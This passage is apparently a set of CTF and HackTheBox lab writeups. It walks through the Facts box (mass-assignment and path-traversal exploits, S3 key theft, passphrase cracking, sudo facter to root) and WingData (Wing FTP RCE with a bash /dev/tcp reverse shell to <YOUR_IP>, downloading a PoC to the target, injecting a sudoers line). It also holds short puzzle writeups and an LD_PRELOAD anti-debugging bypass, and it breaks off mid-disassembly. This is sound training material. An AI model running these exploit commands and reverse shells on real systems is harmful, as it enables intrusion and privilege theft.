Register account → CVE-2025-2304 (mass assignment → admin role)
→ Extract MinIO S3 credentials from admin panel
→ CVE-2026-1776 (path traversal → user flag)
→ Enumerate MinIO internal bucket → SSH private key
→ Crack passphrase (john + rockyou) → SSH as trivia
→ sudo facter --custom-dir (arbitrary Ruby as root) → root flag
\`\`\`

---

## Reconnaissance

### Why we do this
Before touching anything, we need to know what's running. Nmap performs TCP SYN scanning (\`-sS\`) with service/version detection (\`-sV\`) and default scripts (\`-sC\`). Without this step we would have missed port 54321 entirely — which is the key to the whole box.

### Initial scan (quick)

\`\`\`bash
nmap -sSCV -oN nmap -T4 facts.htb
\`\`\`

\`\`\`
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu
80/tcp open  http    nginx 1.26.3 (Ubuntu)
\`\`\`

This quick scan only shows the top 1000 ports. Port 54321 is above that range, so a full port scan is required.

### Full port scan (via ReconX \`--web\` mode)

\`\`\`bash
reconx facts.htb --web
\`\`\`

The full scan reveals the critical third service:

\`\`\`
PORT      STATE SERVICE
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
54321/tcp open  http    MinIO (Golang net/http server)
\`\`\`

**Why port 54321 matters:** The nmap fingerprint shows \`Server: MinIO\` in the HTTP headers and the title redirects to \`http://facts.htb:9001\` — the MinIO web console. MinIO is an S3-compatible object storage server. This tells us the web application is likely using it as a file/media backend, and S3 backends often contain sensitive data.

---

## Enumeration

### Web Application — Port 80

Navigating to \`http://facts.htb\` shows a trivia website built on **Camaleon CMS v2.9.0** — a Ruby on Rails-based CMS. The version is visible in the admin panel after logging in.

**Why identify the CMS version?** Known CVEs are version-specific. Camaleon CMS 2.9.0 has multiple public vulnerabilities. Identifying the exact version immediately narrows the attack surface.

### Directory Enumeration

ReconX runs ffuf automatically. Key findings:

\`\`\`
/admin        → 302 (redirects to /admin/login)
/admin/register → account registration page
/robots.txt   → exists
/sitemap.xml  → exists
/captcha      → image captcha endpoint
\`\`\`

**Why enumerate directories?** The \`/admin\` path is not linked from the homepage. Without fuzzing, we would only see the public trivia site and miss the entire CMS attack surface.

### Technology Fingerprinting

WhatWeb and Nuclei confirm:
- nginx 1.26.3 on Ubuntu
- Ruby on Rails application (Camaleon CMS)
- AWS S3 / MinIO storage backend (Nuclei detects \`Detect Amazon-S3 Bucket\`)
- CORS misconfiguration
- Missing security headers

Nuclei also specifically flags: \`Camaleon CMS Login - Panel\` — confirming the CMS identity without manual inspection.

---

## Exploitation

### Step 1 — Register an Account

Navigate to \`http://facts.htb/admin/register\` and create an account. The registration form has an image captcha that must be solved manually in the browser.

**Why register?** CVE-2025-2304 is a *post-authentication* vulnerability — you need to be logged in first. The registration is open to anyone, so this is a zero-barrier entry point.

After registering, the account has the \`client\` role — minimal privileges, no access to settings or media management.

---

### Step 2 — CVE-2025-2304: Mass Assignment → Admin Role

**What is mass assignment?**
In Ruby on Rails, model attributes can be set in bulk from request parameters. If the developer fails to whitelist which parameters are allowed (using Strong Parameters), an attacker can inject additional fields — like \`role\` — that should never be user-controlled.

**The vulnerable endpoint:**
The "Change Password" functionality sends a PATCH request to:
\`\`\`
POST /admin/users/<your_id>/updated_ajax
\`\`\`

The normal request body looks like:
\`\`\`
_method=patch&authenticity_token=...&password[password]=newpass&password[password_confirmation]=newpass
\`\`\`

By appending \`&password[role]=admin\`, the Rails backend processes the role update alongside the password change because the AJAX endpoint doesn't strictly whitelist the allowed parameters.

**Why this works:** The UI disables the role dropdown (\`disabled="disabled"\`), but this is purely a client-side restriction. The server doesn't validate that role changes are forbidden in this context.

**Automated with the public exploit:**

\`\`\`bash
python3 exploit.py -u http://facts.htb -U test123 -P test -e -r
\`\`\`

\`\`\`
[+] Login confirmed — User ID: 5, Role: client
[+] Updated User Role: admin
[+] Extracting S3 Credentials:
    Access Key: AKIA633F05CB6D247114
    Secret Key: 4MrEvoW+xX6T7Y/ifjprY37gOqQ480JjpMt6r1Bf
    Endpoint:   http://localhost:54321
[+] Reverting User Role: client
\`\`\`

The exploit also extracts the MinIO credentials from the admin settings panel (Settings → Configuration → Filesystem) and optionally reverts the role to avoid detection.

**Note:** The credentials extracted by the exploit differ from those shown in the writeup blog post — the machine generates unique credentials per instance. Always use the credentials from your own exploit run.

---

### Step 3 — CVE-2026-1776: Path Traversal via S3 Backend

**What is this vulnerability?**
The \`download_private_file\` endpoint in Camaleon CMS's media controller takes a \`file\` parameter and passes it to the S3 backend without sanitization. When S3 storage is active, the path is resolved relative to the bucket root — but \`../\` sequences are not stripped, allowing traversal outside the intended directory.

**Why S3 must be active:** The vulnerability is only triggered when the S3/MinIO backend is configured. On a local filesystem backend, the path handling is different. The presence of MinIO on port 54321 is what enables this.

**Reading arbitrary files:**

\`\`\`bash
# Confirm the vulnerability
curl "http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd" \\
  -b "_factsapp=YOUR_COOKIE; auth_token=YOUR_TOKEN"
\`\`\`

From \`/etc/passwd\`, two interesting users are identified:
\`\`\`
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
\`\`\`

**Grabbing the user flag directly:**

\`\`\`bash
curl "http://facts.htb/admin/media/download_private_file?file=../../../home/william/user.txt" \\
  -b "_factsapp=YOUR_COOKIE; auth_token=YOUR_TOKEN"
\`\`\`

\`\`\`
USER FLAG: 4eae3c9235315498728ea32eaf329d27
\`\`\`

**Why william and not trivia?** The user flag is in william's home directory. The \`trivia\` user is the one we'll SSH into later — they are different accounts with different purposes on this machine.

---

## MinIO Enumeration

### Why enumerate MinIO?
The S3 endpoint is exposed externally on port 54321. With valid credentials (extracted from the CMS), we can interact with it directly using the AWS CLI — the same tool used for real AWS S3. MinIO is API-compatible with S3, so the same commands work.

### Configure AWS CLI profile

\`\`\`bash
aws configure set aws_access_key_id AKIA633F05CB6D247114 --profile facts
aws configure set aws_secret_access_key "4MrEvoW+xX6T7Y/ifjprY37gOqQ480JjpMt6r1Bf" --profile facts
aws configure set region us-east-1 --profile facts
\`\`\`

**Why a named profile?** Using \`--profile facts\` keeps these credentials isolated from any real AWS credentials on the system. It also makes commands reproducible.

### List buckets

\`\`\`bash
aws --endpoint-url http://facts.htb:54321 s3 ls --profile facts
\`\`\`

\`\`\`
2025-09-11  internal
2025-09-11  randomfacts
\`\`\`

Two buckets: \`randomfacts\` (the public trivia images) and \`internal\` — the suspicious one.

### Enumerate the internal bucket

\`\`\`bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --recursive --profile facts
\`\`\`

The \`internal\` bucket contains a full home directory backup — including \`.ssh/\`:

\`\`\`
2026-04-25 17:25:59   464B  .ssh/id_ed25519
2026-04-25 17:25:59    82B  .ssh/authorized_keys
\`\`\`

**Why is this significant?** Someone backed up a user's home directory to S3 and left their SSH private key in it. This is a common real-world mistake — developers back up home directories to cloud storage without considering that SSH keys are sensitive credentials.

### Download the private key

\`\`\`bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --profile facts
chmod 600 ./id_ed25519
\`\`\`

**Why \`chmod 600\`?** SSH refuses to use a private key if it's world-readable. The permissions must be restricted to the owner only, or SSH will reject it with a "bad permissions" error.

---

## Cracking the SSH Key Passphrase

The private key is encrypted with a passphrase. Attempting to SSH with it prompts for the passphrase — we don't know it yet.

### Why use ssh2john + john?

\`ssh2john\` converts the SSH private key into a hash format that John the Ripper can process. John then performs a dictionary attack against that hash using rockyou.txt — a wordlist of ~14 million real-world passwords leaked from the RockYou breach.

\`\`\`bash
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

\`\`\`
dragonballz      (/tmp/id_ed25519)
Session completed.
\`\`\`

**Why rockyou.txt?** It's the most commonly used wordlist for CTFs and real engagements because it contains passwords people actually use. The passphrase \`dragonballz\` is a pop culture reference — exactly the kind of weak passphrase rockyou covers.

---

## Initial Access — SSH as trivia

\`\`\`bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
\`\`\`

**Why trivia and not william?** The SSH key was found in the \`internal\` bucket which is a backup of the \`trivia\` user's home directory (confirmed by the \`.ssh/authorized_keys\` matching). William's account holds the user flag but doesn't have SSH access configured.

We're now in as \`trivia\`.

---

## Privilege Escalation

### Enumeration

The first thing to check after getting a shell is what the current user can run with elevated privileges:

\`\`\`bash
sudo -l
\`\`\`

\`\`\`
(ALL) NOPASSWD: /usr/bin/facter
\`\`\`

**Why check sudo -l first?** It's the fastest path to root if misconfigured. \`NOPASSWD\` means we can run this binary as root without knowing the root password. \`(ALL)\` means we can run it as any user, including root.

### What is facter?

Facter is a system inventory tool used by Puppet (a configuration management system) to collect "facts" about a host — OS version, IP addresses, CPU info, etc. It is written in Ruby and supports **custom facts** defined in Ruby scripts.

The key feature: \`facter --custom-dir=/path/to/dir\` loads all \`.rb\` files from the specified directory and executes them as Ruby code to define new facts.

**Why this is dangerous as sudo:** Since facter runs as root, any Ruby code it executes inherits root privileges. This is equivalent to \`sudo ruby\` — full arbitrary code execution as root.

### Crafting the exploit

Create a malicious Ruby fact file:

\`\`\`bash
echo 'Facter.add(:pwn) { setcode { \`cat /root/root.txt\` } }' > /tmp/pwn.rb
\`\`\`

**Breaking down the Ruby syntax:**
- \`Facter.add(:pwn)\` — registers a new fact named \`pwn\`
- \`setcode do ... end\` — defines the Ruby block that runs when the fact is evaluated
- Backticks execute a shell command and return its output as the fact's value

### Execute as root

\`\`\`bash
sudo /usr/bin/facter --custom-dir=/tmp pwn
\`\`\`

\`\`\`
d77cfe6f7c94b764278ee08bcdc10ee2
\`\`\`

**ROOT FLAG: \`d77cfe6f7c94b764278ee08bcdc10ee2\`**

### For an interactive root shell

\`\`\`bash
echo 'Facter.add(:pwn) { setcode { exec("/bin/bash -p") } }' > /tmp/pwn.rb
sudo /usr/bin/facter --custom-dir=/tmp pwn
\`\`\`

\`exec()\` in Ruby replaces the current process with \`/bin/bash -p\`. The \`-p\` flag preserves the effective UID (root), giving a full root shell.

---

## Flags

| Flag | Value |
|------|-------|
| User | \`4eae3c9235315498728ea32eaf329d27\` |
| Root | \`d77cfe6f7c94b764278ee08bcdc10ee2\` |

---

## Tools Used

| Tool | Purpose | Why this tool |
|------|---------|---------------|
| nmap | Port scanning & service detection | Industry standard; \`-sC\` scripts auto-detect services |
| ReconX | Full recon automation | Runs nmap, httpx, ffuf, nuclei, whatweb in sequence |
| ffuf | Directory/endpoint fuzzing | Fast, flexible, supports auto-calibration to reduce false positives |
| nuclei | Vulnerability scanning | Template-based; detected Camaleon CMS login panel and S3 buckets automatically |
| AWS CLI | S3/MinIO interaction | API-compatible with MinIO; same tool used for real AWS |
| ssh2john | SSH key → hash conversion | Required to make the key crackable by John |
| john | Password/passphrase cracking | Dictionary attack against the SSH key hash |
| expect | SSH automation with passphrase | Handles interactive prompts in non-interactive sessions |

---

## Vulnerability Summary

| CVE | Type | Impact |
|-----|------|--------|
| CVE-2025-2304 | Mass Assignment (IDOR) | Escalate any user to admin role |
| CVE-2026-1776 | Path Traversal (S3 backend) | Read arbitrary files as web user |
| sudo facter misconfiguration | Insecure sudo rule | Arbitrary code execution as root |

---

## Key Takeaways

**For defenders:**
1. **Strong Parameters in Rails** — every controller action that accepts user input must explicitly whitelist allowed attributes. The AJAX password endpoint should never accept a \`role\` parameter.
2. **Never store SSH keys in S3 buckets** — even "internal" buckets. Use IAM roles for service-to-service authentication instead of long-lived access keys.
3. **S3 path sanitization** — any endpoint that accepts a file path and proxies it to S3 must strip \`../\` sequences and validate the resolved path stays within the intended prefix.
4. **Sudo hygiene** — granting \`NOPASSWD\` sudo to any tool that can execute arbitrary code (Ruby, Python, Perl, facter, etc.) is equivalent to granting a root shell. Audit sudo rules regularly.

**For attackers (CTF context):**
- Always run a full port scan (\`-p-\`), not just the top 1000. Port 54321 would have been missed otherwise.
- When you find a CMS, identify the exact version immediately and search for CVEs.
- S3/MinIO buckets are goldmines — always enumerate all buckets and their contents when you have credentials.
- \`sudo -l\` is the first thing to run after getting a shell.
`},{id:`htb-wingdata-writeup`,title:`HTB WingData — Writeup`,excerpt:`HackTheBox WingData machine writeup chaining vhost discovery, Wing FTP unauthenticated RCE, XML credential extraction, hash cracking, and tarfile privilege escalation.`,category:`HTB Writeup`,content:`# HTB WingData — Writeup

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.53.152  
**Tools:** nmap, ffuf, searchsploit, hashcat/john, sshpass, python3

---

## Attack Chain

\`\`\`
Nmap → vhost discovery → Wing FTP CVE-2025-47812 RCE (wingftp)
→ credential extraction from XML config → hash crack → SSH as wacky (user flag)
→ sudo misconfiguration + CVE-2025-4517 tarfile abuse → root
\`\`\`

---

## 1. Reconnaissance

### Port Scan

\`\`\`bash
nmap --privileged -sSCV -oN nmap -T4 10.129.53.152
\`\`\`

\`\`\`
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66
                     → redirects to http://wingdata.htb/
\`\`\`

Add to \`/etc/hosts\`:

\`\`\`bash
echo "10.129.53.152 wingdata.htb" | sudo tee -a /etc/hosts
\`\`\`

### VHost Enumeration

\`\`\`bash
ffuf -c -u 'http://wingdata.htb' -H 'Host: FUZZ.wingdata.htb' \\
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\
     -t 25 -fw 21 -s
\`\`\`

Result: \`ftp.wingdata.htb\`

\`\`\`bash
echo "10.129.53.152 ftp.wingdata.htb" | sudo tee -a /etc/hosts
\`\`\`

Navigating to \`http://ftp.wingdata.htb\` reveals a **Wing FTP Server v7.4.3** login page.

---

## 2. Foothold — CVE-2025-47812 (Unauthenticated RCE)

Wing FTP Server ≤ 7.4.3 is vulnerable to unauthenticated RCE via Lua injection (EDB-52347).

**How it works:**  
A POST to \`/loginok.html\` with a username containing a NULL byte (\`%00\`) followed by Lua code causes the C authentication function to truncate at the NULL byte (seeing only \`anonymous\`, which is allowed), while the session file is written with the full unsanitized string. When \`/dir.html\` is accessed with the resulting session cookie, the server executes the embedded Lua payload via \`io.popen()\`.

\`\`\`bash
# Grab the exploit
searchsploit -m 52347

# Test RCE
python3 52347.py -u http://ftp.wingdata.htb -c 'id'
# uid=1000(wingftp) gid=1000(wingftp)

# Reverse shell
nc -lvnp 9999 &
python3 52347.py -u http://ftp.wingdata.htb \\
    -c 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/9999 0>&1"'
\`\`\`

Upgrade shell:

\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
\`\`\`

---

## 3. Lateral Movement — Credential Extraction & Hash Cracking

Wing FTP stores user credentials in XML files under \`/opt/wftpserver/Data/\`.

\`\`\`bash
cat /opt/wftpserver/Data/1/users/wacky.xml
\`\`\`

Relevant field:

\`\`\`xml
<UserName>wacky</UserName>
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
\`\`\`

The \`settings.xml\` confirms password salting is enabled — the salt is appended to the hash as \`hash:SALT\`.

### Crack with Hashcat (mode 1410 — sha256:salt)

\`\`\`bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky_password.txt
hashcat -m 1410 wacky_password.txt /usr/share/wordlists/rockyou.txt
\`\`\`

Recovered password: \`!#7Blushing^*Bride5\`

### SSH as wacky

\`\`\`bash
sshpass -p '!#7Blushing^*Bride5' ssh -o StrictHostKeyChecking=no wacky@10.129.53.152
cat ~/user.txt
\`\`\`

---

## 4. Privilege Escalation — CVE-2025-4517 (tarfile PATH_MAX Bypass)

### Sudo Enumeration

\`\`\`bash
sudo -l
\`\`\`

\`\`\`
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
\`\`\`

The script extracts \`.tar\` archives from \`/opt/backup_clients/backups/\` into a staging directory using:

\`\`\`python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
\`\`\`

This runs as **root**. Despite the \`filter="data"\` parameter, CVE-2025-4517 abuses Python's tarfile PATH_MAX handling to escape the extraction directory via a crafted symlink/hardlink chain, allowing writes to arbitrary paths (e.g., \`/etc/sudoers\`).

### Exploit

\`\`\`bash
# On attacker machine
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
python3 -m http.server 80

# On target (as wacky)
cd /tmp
wget http://<YOUR_IP>/CVE-2025-4517-POC.py
python3 /tmp/CVE-2025-4517-POC.py
\`\`\`

The PoC:
1. Builds a malicious tar archive with a symlink chain that escapes the staging directory
2. Creates a hardlink targeting \`/etc/sudoers\`
3. Injects \`wacky ALL=(ALL) NOPASSWD: ALL\`
4. Places the archive as \`backup_9999.tar\` in \`/opt/backup_clients/backups/\`
5. Triggers the restore script via sudo

After the script runs:

\`\`\`bash
sudo /bin/bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
\`\`\`

---

## Summary

| Step | Technique | CVE |
|------|-----------|-----|
| Foothold | Wing FTP Lua injection → unauthenticated RCE | CVE-2025-47812 |
| Lateral movement | Credential extraction from XML + hash cracking | — |
| Privilege escalation | tarfile PATH_MAX bypass → sudoers injection | CVE-2025-4517 |
`},{id:`day-1`,title:`DAY 1`,excerpt:`CyberStudents Day 1 challenge covering binary to ASCII, hex decoding, and Base64 encoding and decoding transformations to recover hidden flags.`,category:`CTF Writeup`,content:`Here is the challenge description:
![Image](/MyNotes/images/Pasted_image_20251221225724.png)

Output of the start.txt is as follows:
![Image](/MyNotes/images/Pasted_image_20251221225858.png)

## 🔹 Step 1: Binary → ASCII

Each group of **8 bits** represents **one ASCII character**.

Example:

\`00110101 → 53 (decimal) → '5' 00111001 → 57 → '9' 00110011 → 51 → '3'\`

Doing this for the entire sequence converts the binary into a readable ASCII string:

\`59334e6b6531637a624747774e664f474644533138334d4639685a48597a546a64664d6a41794e583033d\`

So after Step 1, we have a **hex-looking string** (characters 0–9 and a–f).

## 🔹 Step 2: ASCII → Hex decoding
That ASCII output is actually **hexadecimal**.

Hex pairs represent bytes:

\`59 → 'Y' 33 → '3' 4e → 'N' 6b → 'k' 65 → 'e' 31 → '1' 63 → 'c' 7a → 'z' ...\`

Decoding the entire hex string gives:

\`Y3NkezVlbGNvbWVfOGFDS180MF9hZHYzTjdfejAyNX0=\`

Now this clearly ends with \`=\` — a big hint 👀  
That means…
## 🔹 Step 3: Base64 decoding

The string is **Base64-encoded**.

Decoding it produces:

\`csd{W3lc0m3_8aCK_70_adv3N7_2025}\``},{id:`day-2`,title:`DAY 2`,excerpt:`CyberStudents Day 2 challenge involving Wireshark packet capture analysis to extract credentials and hidden data from network traffic.`,category:`CTF Writeup`,content:`The challenge description is as follows:
![Image](/MyNotes/images/Pasted_image_20251221230433.png)

Open the file in wireshark and sorting according to length, I observed this:

![Image](/MyNotes/images/Pasted_image_20251221231253.png)

A User logged in successful message.

Sorting in Ascending we should get the sequence of steps that led to this:
![Image](/MyNotes/images/Pasted_image_20251221231647.png)

USERNAME: Elf67
PASSWORD: snowball

The flag is finally: csd{Elf67_snowball}
`},{id:`day-3`,title:`DAY 3`,excerpt:`CyberStudents Day 3 challenge performing DNS chain reconnaissance to discover hidden subdomains and extract flag data from DNS records.`,category:`CTF Writeup`,content:`
Here is the challenge description:
![Image](/MyNotes/images/Pasted_image_20251221232236.png)

1️⃣ DMARC Record Leak

dig TXT _dmarc.krampus.csd.lol

DMARC revealed:

ruf=mailto:forensics@ops.krampus.csd.lol

→ Hidden subdomains discovered:

- \`ops.krampus.csd.lol\`
- \`forensics.ops.krampus.csd.lol\`

2️⃣ ops.krampus.csd.lol TXT Record

internal-services: _ldap._tcp.krampus.csd.lol _kerberos._tcp.krampus.csd.lol _metrics._tcp.krampus.csd.lol

→ Indicates Active Directory / Kerberos / internal monitoring.

3️⃣ SRV Records

dig SRV _metrics._tcp.krampus.csd.lol

Returned:

beacon.krampus.csd.lol:443

This is likely the C2 server.

4️⃣ Beacon TXT Record

dig TXT beacon.krampus.csd.lol

Output:

config=ZXhmaWwua3JhbXB1cy5jc2QubG9s==

Decode Base64:

exfil.krampus.csd.lol

5️⃣ exfil TXT Record

selector=syndicate

→ Indicates the DKIM selector.

6️⃣ DKIM TXT Record

dig syndicate._domainkey.krampus.csd.lol TXT

Returned Base64:

Y3Nke2RuNV9tMTlIVF9CM19LMU5ENF9XME5LeX0=

Decoded:

csd{dn5_m19HT_B3_K1ND4_W0NKy}

### Final Flag

csd{dn5_m19HT_B3_K1ND4_W0NKy}

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*yf11bQ-WDIZvVN1U9KthKw.png)

### DNS Chain Summary

krampus.csd.lol  
  └─> _dmarc (ruf field)  
      └─> ops.krampus.csd.lol  
          └─> _metrics._tcp SRV  
              └─> beacon.krampus.csd.lol  
                  └─> config (base64)  
                      └─> exfil.krampus.csd.lol  
                          └─> DKIM selector  
                              └─> syndicate._domainkey (FLAG!)`},{id:`day-4`,title:`Main anti-debugging check:`,excerpt:`CyberStudents Day 4 challenge writeup covering additional CTF techniques and problem-solving approaches for flag discovery.`,category:`CTF Writeup`,content:`Here is the challenge description:
![Image](/MyNotes/images/Pasted_image_20251221233819.png)

Downloading the binary we get this:
![Image](/MyNotes/images/Pasted_image_20251221234116.png)

Output Analysis:
- ELF 64-bit LSB pie executable - Linux 64-bit executable with Position Independent Execution
- x86-64 - Intel/AMD 64-bit architecture
- dynamically linked - Uses shared libraries
- stripped - Debug symbols removed, making analysis harder
- for GNU/Linux 3.2.0 - Target Linux version
- 
Key Insight: The "stripped" designation meant I wouldn't have function names or debug symbols, requiring more manual analysis.


From the strings output we get several things:
	1. fgets() is used so definetly not Buffer Overflow
	2. There is a success message and a Fail message 
	3. Critical Strings Identified:
	4. "Nice try, but Santa sees when you're peeking!" - Anti-debugging message
	5. "Coal for you! Tampering detected." - Additional anti-tampering message
	6. "Jingle laughs. Wrong credential length!" - Length validation failure
	7. "Welcome to the mainframe, Operative. Jingle owes the elves a round." - Success message
	8. "Access Denied. Jingle smirks." - Content validation failure
	9. Encoded strings: "!1&9s,6r", "/vs,$0v/q?", "9*3$\\"" - Likely encrypted data

Key Functions Detected:
- ptrace - Anti-debugging system call
- fgets, strlen, strcspn - Input handling functions
- __printf_chk, puts - Output functions
	

![Image](/MyNotes/images/Pasted_image_20251221234635.png)

Running the binary we get: (With a fail message)
![Image](/MyNotes/images/Pasted_image_20251221234745.png)

Analysis:
- The program expects user input (access code)
- It immediately rejects input with a "wrong credential length" message
- This suggests it's checking input length before content validation


Using Ltrace is also unsuccessful
![Image](/MyNotes/images/Pasted_image_20251221234901.png)
Strategic Insight: The presence of ptrace indicated sophisticated anti-debugging protection that would need to be bypassed.

Analysis:
- The ptrace(0, 0, 0, 0) call with return value -1 indicates the program is checking if it's being debugged
- When ptrace returns -1, it means another process (debugger) is already tracing this process
- The program immediately exits with the anti-debugging message

I also tried system call tracing:
bash
echo "test" | strace -e trace=write ./day4 2>&1

This also triggered the anti-debugging protection, confirming the binary actively detects analysis attempts.

### Step 5: Disassembly Analysis to Understand Anti-Debugging Mechanism

I disassembled the binary to locate the ptrace call:

bash
objdump -d day4 | grep -A 10 -B 5 ptrace

# Main anti-debugging check:
    1145: 31 c9                xor    %ecx,%ecx      # Clear ECX (4th arg)
    1147: 31 d2                xor    %edx,%edx      # Clear EDX (3rd arg)  
    1149: 31 f6                xor    %esi,%esi      # Clear ESI (2nd arg)
    114b: 31 ff                xor    %edi,%edi      # Clear EDI (1st arg)
    114d: 31 c0                xor    %eax,%eax      # Clear EAX (syscall number)
    114f: e8 bc ff ff ff       call   1110 <ptrace@plt>  # Call ptrace(0,0,0,0)
    1154: 48 ff c0             inc    %rax           # Increment return value
    1157: 75 16                jne    116f           # Jump if NOT zero (not being debugged)
    1159: 48 8d 3d a0 0e 00 00 lea    0xea0(%rip),%rdi  # Load anti-debug message
    1160: e8 5b ff ff ff       call   10c0 <puts@plt>   # Print message
    1165: bf 01 00 00 00       mov    $0x1,%edi      # Exit code 1
    116a: e8 c1 ff ff ff       call   1130 <exit@plt>   # Exit program


Technical Analysis:
- ptrace(PTRACE_TRACEME, 0, 0, 0) - Attempts to trace itself
- If already being traced by a debugger, returns -1
- The code increments the return value (inc %rax)
- If result is not zero (meaning original return was -1), it jumps to the anti-debug message

### Creating a Ptrace Bypass


file: detailed_bypass.c (using tool: write)

 #include <stdio.h>
#include <sys/ptrace.h>
long ptrace(int request, ...) {
fprintf(stderr, "[BYPASS] ptrace() called with request=%d, returning 0\\n", request);
return 0;  // Always return success

 run the following command: 
			 gcc -shared -fPIC detailed_bypass.c -o detailed_bypass.so 
Purpose: Compile the detailed bypass

 run the following command:
			 echo -n "test" | LD_PRELOAD=./detailed_bypass.so ./day4 
Purpose: Show the bypass in action with debug output

NPLD Mainframe Authentication
Enter access code: Jingle laughs. Wrong credential length!
[BYPASS] ptrace() called with request=0, returning 0
 
1. [BYPASS] ptrace() called with request=0 - My function was called instead of the real ptrace
2. returning 0 - I forced it to return success
3. The program continued normally instead of showing the anti-debug message

### Why This Works: Dynamic Linking Explained

When a program calls a library function:

1. Compile time: The binary contains a reference to ptrace@plt (Procedure Linkage Table)
2. Runtime: The dynamic linker resolves this to the actual function address
3. LD_PRELOAD: Forces the linker to check my library FIRST

Let me show you the actual linking process:

I will run the following command: 
				echo "Libraries loaded by day4 normally:" && ldd ./day4 (using tool: shell)
Purpose: Show normal library dependencies

Libraries loaded by day4 normally:
	linux-vdso.so.1 (0x00007f8876a32000)
	libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007f8876600000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f8876a34000)


I will run the following command: 
				echo "With LD_PRELOAD:" && LD_PRELOAD=./bypass_ptrace.so ldd ./day4
Purpose: Show library loading with preload

With LD_PRELOAD:
	linux-vdso.so.1 (0x00007ffae4bf2000)
	./bypass_ptrace.so (0x00007ffae4be0000)
	libc.so.6 => /usr/lib/x86_64-linux-gnu/libc.so.6 (0x00007ffae4800000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffae4bf4000)

> See the difference? My bypass_ptrace.so is loaded BEFORE libc.so.6, so when the binary looks for ptrace, it finds MY version first!

### The Complete Flow

Without bypass:
1. Binary calls ptrace(PTRACE_TRACEME, 0, 0, 0)
2. Dynamic linker finds ptrace in libc.so.6
3. Real ptrace() executes → returns -1 (being debugged)
4. Binary detects debugging → exits with anti-debug message


With bypass:
1. Binary calls ptrace(PTRACE_TRACEME, 0, 0, 0)  
2. Dynamic linker finds ptrace in MY bypass_ptrace.so FIRST
3. My fake ptrace() executes → returns 0 (fake success)
4. Binary thinks it's not being debugged → continues normally


### Why Return 0?

Looking back at the assembly:
assembly
114f: call ptrace           # Call ptrace
1154: inc  %rax            # Increment return value  
1157: jne  116f            # Jump if result != 0


If ptrace returns 0 (not being debugged):
- inc %rax makes it 1
- jne jumps to normal execution (address 116f)

If ptrace returns -1 (being debugged):
- inc %rax makes it 0  
- jne doesn't jump, falls through to anti-debug message

By returning 0, I make the binary think it's not being debugged!

This is a classic technique in malware analysis and reverse engineering - using LD_PRELOAD to intercept and modify system calls without 
actually patching the binary itself.



### Step 7: Deep Disassembly Analysis of Main Logic

With anti-debugging bypassed, I analyzed the main program flow:

bash
objdump -d day4 | grep -A 50 "1140"


Critical Code Sections Identified:

Input Reading Section (addresses 11b3-11c2):
assembly
11b3: 48 8b 15 56 2e 00 00  mov    0x2e56(%rip),%rdx    # Load stdin
11ba: be 40 00 00 00             mov    $0x40,%esi                 # Buffer size 64 bytes
11bf: 48 89 df                          mov    %rbx,%rdi                  # Buffer address
11c2: e8 39 ff ff ff                    call   1100 <fgets@plt>           # Read input


String Processing (addresses 11cc-11db):
assembly
11cc: 48 89 df                                 mov    %rbx,%rdi            # Input string
11cf: 48 8d 35 ac 0e 00 00            lea    0xeac(%rip),%rsi     # "\\n" character
11d6: e8 15 ff ff ff                           call   10f0 <strcspn@plt>  # Find newline
11db: 48 89 df                                 mov    %rbx,%rdi            # Input string
11de: c6 44 04 08 00                      movb   $0x0,0x8(%rsp,%rax,1) # Null terminate


Length Validation (addresses 11e3-11fa):
assembly
11e3: e8 e8 fe ff ff                  call   10d0 <strlen@plt>         # Get string length
11e8: 48 83 f8 17                    cmp    $0x17,%rax              # Compare with 23 (0x17)
11ec: 74 0e                               je     11fc                              # Jump if equal to 23
11ee: 48 8d 3d 8f 0e 00 00     lea    0xe8f(%rip),%rdi       # "Wrong length" message
11f5: e8 c6 fe ff ff                    call   10c0 <puts@plt>            # Print error
11fa: eb 28                                jmp    1224                           # Exit


Key Discovery: The program requires exactly 23 characters (0x17 in hex).

### Step 8: Testing Length Requirement

I verified the length requirement:

bash
echo -n "12345678901234567890123" | wc -c  # Outputs: 23
echo -n "12345678901234567890123" | LD_PRELOAD=./bypass_ptrace.so ./day4


Output:
NPLD Mainframe Authentication
Enter access code: Access Denied. Jingle smirks.


Success! The length check passed, but content validation failed. This confirmed the 23-character requirement and revealed there's a 
content validation step.

### Step 9: Analysis of Validation Functions

I analyzed the validation functions called after length check:

bash
objdump -d day4 | grep -A 30 "1339:"

Main Validation Function (1362):
assembly
1362: f3 0f 1e fa                              endbr64
1366: 31 c0                                       xor    %eax,%eax              # Counter = 0
1368: 48 8d 0d a1 0d 00 00            lea    0xda1(%rip),%rcx    # Load reference string (0x2110)

# Main validation loop:
136f: 0f be 14 07             movsbl (%rdi,%rax,1),%edx      # Load input[i] (sign-extended)
